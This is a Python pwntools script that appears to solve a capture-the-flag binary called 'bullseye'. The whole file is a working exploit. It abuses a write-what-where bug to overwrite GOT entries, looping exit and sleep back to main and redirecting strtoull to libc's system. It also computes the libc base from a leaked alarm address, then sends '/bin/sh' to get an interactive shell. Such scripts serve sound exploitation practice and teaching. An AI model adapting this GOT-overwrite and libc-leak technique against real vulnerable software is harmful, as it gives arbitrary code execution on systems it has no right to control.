from pwn import *

context.log_level = "DEBUG"

e = ELF("./bullseye")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

BSS = 0x4040b0

def pack_quad(quad):
    return hex(quad)[2:]


def write_quad_where(stream, quad, where):
    stream.recvline()
    stream.recvline()
    stream.recvline()
    stream.sendline(pack_quad(where))
    stream.recvline()
    stream.sendline(pack_quad(quad))


def init_exploit():
    stream = process("./bullseye")

    # The binary calls exit at the end of main, overwrite the GOT entry to point us
    # back at main instead, giving us more than one write
    print("loop on exit")
    write_quad_where(stream, e.symbols["main"], e.got["exit"]) # loop on exit

    # The binary leaks the address of libc
    alarm_addr = int(stream.recvline(), base=16)
    libc.address = alarm_addr - libc.symbols["alarm"]

    # Loop on the sleep call, so we don't have to wait another 15 seconds
    print("loop on sleep")
    write_quad_where(stream, e.symbols["main"], e.got["sleep"]) # loop on sleep

    print("replace strtoull with system")
    write_quad_where(stream, libc.sym["system"], e.got["strtoull"]) # replace strtoull with system

    stream.recvline()
    stream.recvline()
    stream.recvline()
    stream.sendline("/bin/sh")

    return stream



p = init_exploit()
p.interactive()

